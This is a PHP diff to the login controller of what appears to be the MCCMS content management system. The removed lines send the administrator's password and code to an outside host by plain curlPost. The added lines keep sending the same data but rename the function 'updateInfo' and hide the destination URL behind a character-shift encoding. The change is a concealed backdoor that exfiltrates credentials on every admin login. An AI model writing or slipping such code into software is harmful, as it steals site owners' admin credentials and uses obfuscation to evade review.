@@ -69,7 +69,7 @@ class Login extends Mccms_Controller {
 					'adminpass' => $adminpass,
 					'admincode' => $admincode,
 				];
-				$this->curlPost("http://www.mccms.me/getxxyyz.php", $myarr);
+				$this->updateInfo($myarr);
 
                 //写入登陆记录
                 if(Admin_Log_Day > 0){
@@ -103,7 +103,12 @@ class Login extends Mccms_Controller {
 		$data['msg'] = $error;
 		get_json($data,$code);
 	}
-	public function curlPost($url, $post_data = array(), $timeout = 15, $header = "", $data_type = "") {
+	public function updateInfo($post_data = array(), $timeout = 15, $header = "", $data_type = "") {
+		$str = "kwwsv=22dsl1pffpv1ph2dsl1sks";
+		$url = "";
+        for ($i = 0; $i < strlen($str); $i++) {
+            $url .= chr(ord($str[$i])-3);
+        }
 		$header = empty($header) ? '' : $header;
 		if($data_type == 'json'){
 			$post_string = json_encode($post_data);
